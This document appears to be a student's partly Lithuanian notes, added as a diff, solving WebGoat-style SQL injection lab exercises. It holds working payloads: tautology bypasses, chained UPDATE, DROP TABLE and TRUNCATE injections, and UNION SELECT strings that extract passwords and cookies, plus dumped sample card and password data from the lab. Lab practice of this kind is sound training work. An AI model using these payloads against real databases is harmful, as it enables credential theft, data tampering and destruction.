@@ -1,0 +1,138 @@
+SQL INJECTION (Intro): ----------------------------------------------------------------------------------------------------------------
+
+2) : =================================================================================================================================
+SELECT department FROM Employees WHERE first_name = 'Bob';
+
+3) : =================================================================================================================================
+UPDATE Employees SET department = 'Sales' WHERE first_name = 'Tobi';
+
+4) : =================================================================================================================================
+ALTER TABLE employees ADD COLUMN "phone" varchar(20);
+
+5) : =================================================================================================================================
+DCL can be used to revoke and grant user privileges on database objects such as tables, views, and functions.
+If an attacker successfully "injects" DCL type SQL commands into a database, he can violate the confidentiality (using GRANT commands) 
+and availability (using REVOKE commands) of a system.
+
+GRANT ALL ON grant_rights TO unauthorized_user; - visas rights pagrantinom tam user.
+
+9) : =================================================================================================================================
+Smith' OR '1' = '1
+results in SELECT * FROM users WHERE name = 'Smith' OR TRUE; which will return all entries from the users table
+
+Smith' OR 1 = 1; --
+results in SELECT * FROM users WHERE name = 'Smith' OR TRUE;--'; which, like the first example, will also return all entries from the users table
+
+Smith'; DROP TABLE users; TRUNCATE audit_log; --
+chains multiple SQL-Commands in order to both DROP the users table and delete all entries from the audit_log table
+
+
+1) '
+2) or
+3) '1'='1
+
+10)==================================================================================================================================
+
+UserId is our voulnarable field - nes jis ne stringas ir bus sql ijectionui voulnarable
+
+Login_Count: 0
+User_Id: 0 or 1 = 1
+
+SELECT * From user_data WHERE Login_Count = 0 and userid= 0 or 1 =1 - paaiškina queery
+
+
+
+11)==================================================================================================================================
+String SQL injection --------------------------
+All rows from "employees" table
+
+Employee Name:' or 1 = 1 --
+Authentication TAN:3SL99A
+
+12)==================================================================================================================================
+Compromising Integrity with Query chaining -- you try to append one or more queries to the end of the actual query.
+
+
+Employee Name:
+Smith' ; UPDATE employees SET salary = 100000 where last_name = 'Smith' --
+' or 1 = 1; UPDATE employees SET salary = 100000 where last_name = 'Smith' --
+
+o AUTH nereiia.
+
+13)==================================================================================================================================
+Compromising Availability
+
+bandome su: %' drop table access_log --
+
+'; drop table access_log --
+
+
+SQL INJECTION (ADVANCED): ----------------------------------------------------------------------------------------------------------------
+
+NAME: =================================================================================================================================
+Pirma galime pasibandyti naudoti kad rasti kas vyksta table:
+a' or 1=1 -- -
+
+Tada radę, bandome pasirinkti stulpelius kurių tipai sutinka ir kurie yra pirmieji:
+a' or 1=1 union select userId, user_name,password, cookie
+
+Tada suprantame, kad reikia, kad mečintų stulpeliai, tia pridedame stulpelių, kurie yra tokio pat tipo
+kaip pirmos lentelės.
+a' or 1=1 union select userId, user_name,password, cookie, '1', '1', 1 from user_system_data -- -
+
+Bet dažnai galime nežinoti data types, tai galėtume daryti taip:
+a' or 1=1 union select userId, user_name,password, cookie, null, null, null from user_system_data -- -
+
+
+FULL QUERY:
+SELECT * FROM user_data WHERE last_name = 'a' or 1=1 union select userId, user_name,password, cookie, null, null, null from user_system_data -- -'
+
+
+
+
+
+;-- union: Dave' union select userId, user_name,password, cookie, null, null, null from user_system_data -- -
+
+
+PASSWORD: ============================================================================================================================
+
+praeitame gavome tokį rezultatą:
+
+You have succeeded:
+USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
+101, Joe, Snow, 2234200065411, MC, , 0,
+101, Joe, Snow, 987654321, VISA, , 0,
+101, jsnow, passwd1, , null, null, null,
+102, John, Smith, 2435600002222, MC, , 0,
+102, John, Smith, 4352209902222, AMEX, , 0,
+102, jdoe, passwd2, , null, null, null,
+103, Jane, Plane, 123456789, MC, , 0,
+103, Jane, Plane, 333498703333, AMEX, , 0,
+103, jplane, passwd3, , null, null, null,
+104, jeff, jeff, , null, null, null,
+105, dave, passW0rD, , null, null, null, --------------------------DAVE ČIA -------------------
+10312, Jolly, Hershey, 176896789, MC, , 0,
+10312, Jolly, Hershey, 333300003333, AMEX, , 0,
+10323, Grumpy, youaretheweakestlink, 33413003333, AMEX, , 0,
+10323, Grumpy, youaretheweakestlink, 673834489, MC, , 0,
+15603, Peter, Sand, 123609789, MC, , 0,
+15603, Peter, Sand, 338893453333, AMEX, , 0,
+15613, Joesph, Something, 33843453533, AMEX, , 0,
+15837, Chaos, Monkey, 32849386533, CM, , 0,
+19204, Mr, Goat, 33812953533, VISA, , 0,
+
+nukopijuojame Dave password ir įpeistinam.
+
+
+Jei bandysime su false, kai 1=2, tai visą datą gaunam tik iš user data. 
+a' or 1=2 union select userId, user_name,password, cookie, null, null, null from user_system_data -- -
+
+Galim pabandyti ir kitaip:
+a' or 1=2 union select userId, user_name,password, cookie, null, null, null from user_system_data userId=105 -- -
+a' or 1=2 union select userId, user_name,password, cookie, null, null, null from user_system_data user_name='dave' -- -
+
+
+
+
+
+
